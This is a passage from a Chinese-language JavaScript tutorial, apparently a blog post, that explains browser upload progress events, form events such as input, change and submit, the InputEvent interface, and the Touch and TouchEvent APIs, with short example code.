function_">log</span>(<span class="string">&#x27;用户取消了传输&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面是下载过程的进度事件，还存在<strong>上传过程的进度事件</strong>。这时所有监听函数都要放在<code>XMLHttpRequest.upload</code>对象上面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">upload</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;progress&#x27;</span>, updateProgress, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="property">upload</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, transferComplete, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="property">upload</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, transferFailed, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="property">upload</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;abort&#x27;</span>, transferCanceled, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>();</span><br></pre></td></tr></table></figure>



<h2 id="七、表单事件"><a href="#七、表单事件" class="headerlink" title="七、表单事件"></a>七、表单事件</h2><h3 id="1、表单事件的种类"><a href="#1、表单事件的种类" class="headerlink" title="1、表单事件的种类"></a>1、表单事件的种类</h3><h4 id="1-1-input-事件-（值发生变化触发，会连续）"><a href="#1-1-input-事件-（值发生变化触发，会连续）" class="headerlink" title="1.1 input 事件 （值发生变化触发，会连续）"></a>1.1 input 事件 （值发生变化触发，会连续）</h4><p><code>input</code>事件当<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>的<strong>值发生变化时触发</strong>。对于复选框（<code>&lt;input type=checkbox&gt;</code>）或单选框（<code>&lt;input type=radio&gt;</code>），用户改变选项时，也会触发这个事件。另外，对于打开<code>contenteditable</code>属性的元素，只要值发生变化，也会触发<code>input</code>事件。</p>
<p><code>input</code>事件的一个特点，就是<strong>会连续触发</strong>，比如<strong>用户每按下一次按键，就会触发一次<code>input</code>事件</strong>。</p>
<p><code>input</code>事件对象<strong>继承了<code>InputEvent</code>接口</strong>。</p>
<p>该事件跟<code>change</code>事件很像，不同之处在于**<code>input</code>事件在元素的值发生变化后立即发生<strong>，</strong>而<code>change</code>在元素失去焦点时发生<strong>，而内容此时可能已经变化多次。也就是说，如果有连续变化，</strong><code>input</code>事件会触发多次，而<code>change</code>事件只在失去焦点时触发一次。**</p>
<p>下面是<code>&lt;select&gt;</code>元素的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">&lt;select id=&quot;mySelect&quot;&gt;</span></span><br><span class="line"><span class="comment">  &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;</span></span><br><span class="line"><span class="comment">  &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;</span></span><br><span class="line"><span class="comment">  &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;</span></span><br><span class="line"><span class="comment">&lt;/select&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">inputHandler</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>.<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mySelect = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#mySelect&#x27;</span>);</span><br><span class="line">mySelect.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, inputHandler);</span><br></pre></td></tr></table></figure>

<p>上面代码中，改变下拉框选项时，会触发<code>input</code>事件，从而执行回调函数<code>inputHandler</code>。</p>
<h4 id="1-2-select-事件-（选中文本时触发）"><a href="#1-2-select-事件-（选中文本时触发）" class="headerlink" title="1.2 select 事件 （选中文本时触发）"></a>1.2 select 事件 （选中文本时触发）</h4><p><code>select</code>事件当在<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>里面<strong>选中文本时触发</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input id=&quot;test&quot; type=&quot;text&quot; value=&quot;Select me!&quot; /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> elem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">elem.<span class="title function_">addEventListener</span>(<span class="string">&#x27;select&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">type</span>); <span class="comment">// &quot;select&quot; 事件类型</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">var</span> _target = e.<span class="property">target</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(_target.<span class="property">value</span>); <span class="comment">// 文本框的全部值</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(_target.<span class="property">selectionDirection</span>); <span class="comment">// 选择的方向：&#x27;forward&#x27;正向、&#x27;backward&#x27;反向</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(_target.<span class="property">selectionStart</span>); <span class="comment">// 开始选择的索引</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(_target.<span class="property">selectionEnd</span>); <span class="comment">// 结束选择的索引</span></span><br><span class="line">  <span class="comment">// 注意：开始和结束索引是不分选择方向的，开始的索引一直是靠前的</span></span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(_target.<span class="property">value</span>.<span class="title function_">slice</span>(_target.<span class="property">selectionStart</span>, _target.<span class="property">selectionEnd</span>)) <span class="comment">// 选中的那部分字符串</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>选中的文本可以通过<code>event.target</code>元素的<code>selectionDirection</code>、<code>selectionEnd</code>、<code>selectionStart</code>和<code>value</code>属性拿到。</p>
<h4 id="1-3-change-事件-（值发生变化时触发，单次）"><a href="#1-3-change-事件-（值发生变化时触发，单次）" class="headerlink" title="1.3 change 事件 （值发生变化时触发，单次）"></a>1.3 change 事件 （值发生变化时触发，单次）</h4><p><code>change</code>事件当<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>的<strong>值发生变化时触发</strong>。它与<code>input</code>事件的最大不同，就是<strong>不会连续触发，只有当全部修改完成时才会触发</strong>，另一方面<code>input</code>事件必然伴随<code>change</code>事件。具体来说，分成以下几种情况。</p>
<ul>
<li>激活单选框（radio）或复选框（checkbox）时触发。</li>
<li>用户提交时触发。比如，从下列列表（select）完成选择，在日期或文件输入框完成选择。</li>
<li>当文本框或<code>&lt;textarea&gt;</code>元素的值发生改变，并且丧失焦点时触发。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;select size=&quot;1&quot; onchange=&quot;changeEventHandler(event);&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;option&gt;chocolate&lt;/option&gt;</span></span><br><span class="line"><span class="comment">//   &lt;option&gt;strawberry&lt;/option&gt;</span></span><br><span class="line"><span class="comment">//   &lt;option&gt;vanilla&lt;/option&gt;</span></span><br><span class="line"><span class="comment">// &lt;/select&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeEventHandler</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">target</span>.<span class="property">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果比较一下上面<code>input</code>事件的例子，你会发现对于<code>&lt;select&gt;</code>元素来说，<code>input</code>和<code>change</code>事件基本是等价的。</p>
<h4 id="1-4-invalid-事件-（表单提交不满足条件触发）"><a href="#1-4-invalid-事件-（表单提交不满足条件触发）" class="headerlink" title="1.4 invalid 事件 （表单提交不满足条件触发）"></a>1.4 invalid 事件 （表单提交不满足条件触发）</h4><p><strong>用户提交表单时，如果表单元素的值不满足校验条件，就会触发<code>invalid</code>事件。</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">required</span> <span class="attr">oninvalid</span>=<span class="string">&quot;console.log(&#x27;invalid input&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，输入框是必填的。如果不填，用户点击按钮提交时，就会触发输入框的<code>invalid</code>事件，导致提交被取消。</p>
<h4 id="1-5-reset-事件（重置），submit-事件（提交）"><a href="#1-5-reset-事件（重置），submit-事件（提交）" class="headerlink" title="1.5 reset 事件（重置），submit 事件（提交）"></a>1.5 reset 事件（重置），submit 事件（提交）</h4><p><code>reset</code>事件当<strong>表单重置（所有表单成员变回默认值）时触发。</strong></p>
<p><code>submit</code>事件当<strong>表单数据向服务器提交时触发</strong>。</p>
<p>注意，<strong>这两个事件发生在表单对象<code>&lt;form&gt;</code>上，而不是发生在表单的成员上</strong>，因为提交的是表单，而不是表单成员。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onreset</span>=<span class="string">&quot;console.log(&#x27;触发了重置事件&#x27;)&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;console.log(&#x27;触发了提交事件&#x27;)&quot;</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">action</span>=<span class="string">&quot;html_form_action.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Duck&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="2、InputEvent-接口（input事件的实例）"><a href="#2、InputEvent-接口（input事件的实例）" class="headerlink" title="2、InputEvent 接口（input事件的实例）"></a>2、InputEvent 接口（input事件的实例）</h3><p><strong><code>InputEvent</code>接口主要用来描述<code>input</code>事件的实例</strong>。该接口<strong>继承了<code>Event</code>接口</strong>，还定义了一些自己的实例属性和实例方法。</p>
<p>浏览器原生提供<code>InputEvent()</code>构造函数，用来生成实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InputEvent</span>(type, options) <span class="comment">// 参数一，事件名称；参数二，配置对象</span></span><br></pre></td></tr></table></figure>

<p><code>InputEvent</code>构造函数可以接受两个参数。第一个参数是字符串，表示<strong>事件名称</strong>，该参数是必需的。第二个参数是一个<strong>配置对象</strong>，用来设置事件实例的属性，该参数是可选的。配置对象的字段除了<code>Event</code>构造函数的配置属性，还可以设置下面的字段，这些字段都是可选的。</p>
<ul>
<li><code>inputType</code>：字符串，表示<strong>发生变更的类型</strong>（详见下文）。</li>
<li><code>data</code>：字符串，表示<strong>插入的字符串</strong>。如果没有插入的字符串（比如删除操作），则返回<code>null</code>或空字符串。</li>
<li><code>dataTransfer</code>：返回一个 <strong>DataTransfer 对象实例，该属性通常只在输入框接受富文本输入时有效</strong>。</li>
</ul>
<p><code>InputEvent</code>的实例属性主要就是上面三个属性，这三个实例属性都是<strong>只读的</strong>。</p>
<h4 id="（1）InputEvent-data-变动的那部分内容"><a href="#（1）InputEvent-data-变动的那部分内容" class="headerlink" title="（1）InputEvent.data 变动的那部分内容"></a>（1）InputEvent.data 变动的那部分内容</h4><p><code>InputEvent.data</code>属性返回一个字符串，表示<strong>变动的内容</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;myInput&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myInput&#x27;</span>);</span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, myFunction, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，如果手动在输入框里面输入<code>abc</code>，控制台会先输出<code>a</code>，再在下一行输出<code>b</code>，再在下一行输出<code>c</code>。然后选中<code>abc</code>，一次性将它们删除，控制台会输出<code>null</code>或一个空字符串。</p>
<h4 id="（2）InputEvent-inputType-变更类型"><a href="#（2）InputEvent-inputType-变更类型" class="headerlink" title="（2）InputEvent.inputType 变更类型"></a>（2）InputEvent.inputType 变更类型</h4><p><code>InputEvent.inputType</code>属性返回一个字符串，表示字符串<strong>发生变更的类型</strong>。</p>
<p>对于常见情况，Chrome 浏览器的返回值如下。完整列表可以参考<a target="_blank" rel="noopener" href="https://w3c.github.io/input-events/index.html#dom-inputevent-inputtype">文档</a>。</p>
<ul>
<li>手动插入文本：<code>insertText</code></li>
<li>粘贴插入文本：<code>insertFromPaste</code></li>
<li>向后删除：<code>deleteContentBackward</code></li>
<li>向前删除：<code>deleteContentForward</code></li>
</ul>
<h4 id="（3）InputEvent-dataTransfer"><a href="#（3）InputEvent-dataTransfer" class="headerlink" title="（3）InputEvent.dataTransfer"></a>（3）InputEvent.dataTransfer</h4><p><code>InputEvent.dataTransfer</code>属性<strong>返回一个 DataTransfer 实例。该属性只在文本框接受粘贴内容（insertFromPaste）或拖拽内容（<code>insertFromDrop</code>）时才有效</strong>。</p>
<h2 id="八、触摸事件"><a href="#八、触摸事件" class="headerlink" title="八、触摸事件"></a>八、触摸事件</h2><h3 id="1、触摸操作概述"><a href="#1、触摸操作概述" class="headerlink" title="1、触摸操作概述"></a>1、触摸操作概述</h3><p>浏览器的触摸 API 由三个部分组成。</p>
<ul>
<li>Touch：一个触摸点的实例</li>
<li>TouchList：多个触摸点集合的实例</li>
<li>TouchEvent：触摸引发的事件实例</li>
</ul>
<p><code>Touch</code>接口的实例对象用来表示触摸点（一根手指或者一根触摸笔），包括<strong>位置、大小、形状、压力、目标元素等属性</strong>。有时，触摸动作由多个触摸点（多根手指）组成，多个触摸点的集合由<code>TouchList</code>接口的实例对象表示。<code>TouchEvent</code>接口的实例对象代表由触摸引发的事件，只有触摸屏才会引发这一类事件。</p>
<p>很多时候，<strong>触摸事件和鼠标事件同时触发</strong>，即使这个时候并没有用到鼠标。这是为了让那些只定义鼠标事件、没有定义触摸事件的代码，在触摸屏的情况下仍然能用。如果想避免这种情况，<strong>可以用<code>event.preventDefault</code>方法阻止发出鼠标事件</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">TouchEvent</span> &#123;<span class="attr">isTrusted</span>: <span class="literal">true</span>, <span class="attr">touches</span>: <span class="title class_">TouchList</span>, <span class="attr">targetTouches</span>: <span class="title class_">TouchList</span>, <span class="attr">changedTouches</span>: <span class="title class_">TouchList</span>, <span class="attr">altKey</span>: <span class="literal">false</span>, …&#125; <span class="comment">// TouchEvent接口 ，继承Event接口属性和方法</span></span><br><span class="line">    <span class="attr">altKey</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">bubbles</span>: <span class="literal">true</span></span><br><span class="line">    <span class="attr">cancelBubble</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">cancelable</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">changedTouches</span>: <span class="title class_">TouchList</span> <span class="comment">// TouchList 接口 （所有触摸点集合）</span></span><br><span class="line">            <span class="number">0</span>: <span class="title class_">Touch</span> <span class="comment">// Touch 接口 （单个触摸点）</span></span><br><span class="line">                <span class="attr">clientX</span>: <span class="number">232</span></span><br><span class="line">                <span class="attr">clientY</span>: <span class="number">96</span></span><br><span class="line">                <span class="attr">force</span>: <span class="number">1</span> <span class="comment">// 触摸压力</span></span><br><span class="line">                <span class="attr">identifier</span>: <span class="number">0</span> <span class="comment">// 唯一ID</span></span><br><span class="line">                <span class="attr">pageX</span>: <span class="number">232</span></span><br><span class="line">                <span class="attr">pageY</span>: <span class="number">96</span></span><br><span class="line">                <span class="attr">radiusX</span>: <span class="number">11.5</span></span><br><span class="line">                <span class="attr">radiusY</span>: <span class="number">11.5</span></span><br><span class="line">                <span class="attr">region</span>: <span class="literal">null</span></span><br><span class="line">                <span class="attr">rotationAngle</span>: <span class="number">0</span></span><br><span class="line">                <span class="attr">screenX</span>: <span class="number">476</span></span><br><span class="line">                <span class="attr">screenY</span>: <span class="number">266</span></span><br><span class="line">                <span class="attr">target</span>: html <span class="comment">// 触摸目标元素</span></span><br><span class="line">                <span class="attr">__proto__</span>: <span class="title class_">Touch</span></span><br><span class="line">                <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    	<span class="attr">__proto__</span>: <span class="title class_">TouchList</span></span><br><span class="line">        </span><br><span class="line">    <span class="attr">composed</span>: <span class="literal">true</span></span><br><span class="line">    <span class="attr">ctrlKey</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">currentTarget</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">defaultPrevented</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">detail</span>: <span class="number">0</span></span><br><span class="line">    <span class="attr">eventPhase</span>: <span class="number">0</span></span><br><span class="line">    <span class="attr">isTrusted</span>: <span class="literal">true</span></span><br><span class="line">    <span class="attr">metaKey</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">path</span>: (<span class="number">3</span>) [html, <span class="variable language_">document</span>, <span class="title class_">Window</span>]</span><br><span class="line">    <span class="attr">returnValue</span>: <span class="literal">true</span></span><br><span class="line">    <span class="attr">shiftKey</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">sourceCapabilities</span>: <span class="title class_">InputDeviceCapabilities</span> &#123;<span class="attr">firesTouchEvents</span>: <span class="literal">true</span>&#125;</span><br><span class="line">    <span class="attr">srcElement</span>: html</span><br><span class="line">    <span class="attr">target</span>: html</span><br><span class="line">    <span class="attr">targetTouches</span>: <span class="title class_">TouchList</span> &#123;<span class="number">0</span>: <span class="title class_">Touch</span>, <span class="attr">length</span>: <span class="number">1</span>&#125; <span class="comment">// TouchList 接口 （所有触摸点集合）</span></span><br><span class="line">    <span class="attr">timeStamp</span>: <span class="number">994.1749999998137</span></span><br><span class="line">    <span class="attr">touches</span>: <span class="title class_">TouchList</span> &#123;<span class="number">0</span>: <span class="title class_">Touch</span>, <span class="attr">length</span>: <span class="number">1</span>&#125; <span class="comment">// TouchList 接口 （所有触摸点集合）</span></span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;touchmove&quot;</span> <span class="comment">// 当前触摸事件类型</span></span><br><span class="line">    <span class="attr">view</span>: <span class="title class_">Window</span> &#123;<span class="attr">postMessage</span>: ƒ, <span class="attr">blur</span>: ƒ, <span class="attr">focus</span>: ƒ, <span class="attr">close</span>: ƒ, <span class="attr">parent</span>: <span class="title class_">Window</span>, …&#125;</span><br><span class="line">    <span class="attr">which</span>: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2、Touch-接口"><a href="#2、Touch-接口" class="headerlink" title="2、Touch 接口"></a>2、Touch 接口</h3><h4 id="2-1-Touch-接口概述-（单个触摸点）"><a href="#2-1-Touch-接口概述-（单个触摸点）" class="headerlink" title="2.1 Touch 接口概述 （单个触摸点）"></a>2.1 Touch 接口概述 （单个触摸点）</h4><p>Touch 接口<strong>代表单个触摸点</strong>。触摸点可能是一根手指，也可能是一根触摸笔。</p>
<p>浏览器原生提供<code>Touch</code>构造函数，用来生成<code>Touch</code>实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> touch = <span class="keyword">new</span> <span class="title class_">Touch</span>(touchOptions);</span><br></pre></td></tr></table></figure>

<p><code>Touch</code>构造函数接受一个<strong>配置对象作为参数</strong>，它有以下属性。</p>
<ul>
<li><code>identifier</code>：必需，类型为整数，表示触摸点的唯一 ID。</li>
<li><code>target</code>：必需，类型为元素节点，表示触摸点开始时所在的网页元素。</li>
<li><code>clientX</code>：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的水平距离，默认为0。</li>
<li><code>clientY</code>：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的垂直距离，默认为0。</li>
<li><code>screenX</code>：可选，类型为数值，表示触摸点相对于屏幕左上角的水平距离，默认为0。</li>
<li><code>screenY</code>：可选，类型为数值，表示触摸点相对于屏幕左上角的垂直距离，默认为0。</li>
<li><code>pageX</code>：可选，类型为数值，表示触摸点相对于网页左上角的水平位置（即包括页面的滚动距离），默认为0。</li>
<li><code>pageY</code>：可选，类型为数值，表示触摸点相对于网页左上角的垂直位置（即包括页面的滚动距离），默认为0。</li>
<li><code>radiusX</code>：可选，类型为数值，表示触摸点周围受到影响的椭圆范围的 X 轴半径，默认为0。</li>
<li><code>radiusY</code>：可选：类型为数值，表示触摸点周围受到影响的椭圆范围的 Y 轴半径，默认为0。</li>
<li><code>rotationAngle</code>：可选，类型为数值，表示触摸区域的椭圆的旋转角度，单位为度数，在0到90度之间，默认值为0。</li>
<li><code>force</code>：可选，类型为数值，范围在<code>0</code>到<code>1</code>之间，表示触摸压力。<code>0</code>代表没有压力，<code>1</code>代表硬件所能识别的最大压力，默认为<code>0</code>。</li>
</ul>
<h4 id="2-2-Touch-接口的实例属性"><a href="#2-2-Touch-接口的实例属性" class="headerlink" title="2.2 Touch 接口的实例属性"></a>2.2 Touch 接口的实例属性</h4><h5 id="（1）Touch-identifier-触摸点的ID"><a href="#（1）Touch-identifier-触摸点的ID" class="headerlink" title="（1）Touch.identifier 触摸点的ID"></a>（1）Touch.identifier 触摸点的ID</h5><p><code>Touch.identifier</code>属性返回一个整数，表示触摸点的唯一 ID。这个值在整个触摸过程保持不变，直到触摸事件结束。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">someElement.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">changedTouches</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">changedTouches</span>[i].<span class="property">identifier</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>



<h5 id="（2）Touch-screenX，Touch-screenY，Touch-clientX，Touch-clientY，pageX，pageY-（相对屏幕、浏览器、文档的坐标）"><a href="#（2）Touch-screenX，Touch-screenY，Touch-clientX，Touch-clientY，pageX，pageY-（相对屏幕、浏览器、文档的坐标）" class="headerlink" title="（2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY （相对屏幕、浏览器、文档的坐标）"></a>（2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY （相对屏幕、浏览器、文档的坐标）</h5><p><code>Touch.screenX</code>属性和<code>Touch.screenY</code>属性，分别表示触摸点相对于屏幕左上角的横坐标和纵坐标，与页面是否滚动无关。</p>
<p><code>Touch.clientX</code>属性和<code>Touch.clientY</code>属性，分别表示触摸点相对于浏览器视口左上角的横坐标和纵坐标，与页面是否滚动无关。</p>
<p><code>Touch.pageX</code>属性和<code>Touch.pageY</code>属性，分别表示触摸点相对于当前页面左上角的横坐标和纵坐标，包含了页面滚动带来的位移。</p>
<h5 id="（3）Touch-radiusX，Touch-radiusY，Touch-rotationAngle-（触摸椭圆区域半径、角度）"><a href="#（3）Touch-radiusX，Touch-radiusY，Touch-rotationAngle-（触摸椭圆区域半径、角度）" class="headerlink" title="（3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle （触摸椭圆区域半径、角度）"></a>（3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle （触摸椭圆区域半径、角度）</h5><p><code>Touch.radiusX</code>属性和<code>Touch.radiusY</code>属性，分别返回<strong>触摸点周围受到影响的椭圆范围的 X 轴半径和 Y 轴半径，单位为像素。乘以 2 就可以得到触摸范围的宽度和高度</strong>。</p>
<p><code>Touch.rotationAngle</code>属性表示触摸区域的椭圆的旋转角度，单位为度数，在<code>0</code>到<code>90</code>度之间。</p>
<p>上面这三个属性共同定义了<strong>用户与屏幕接触的区域</strong>，对于描述手指这一类非精确的触摸，很有帮助。指尖接触屏幕，触摸范围会形成一个椭圆，这三个属性就用来描述这个椭圆区域。</p>
<p>下面是一个示例。</p>
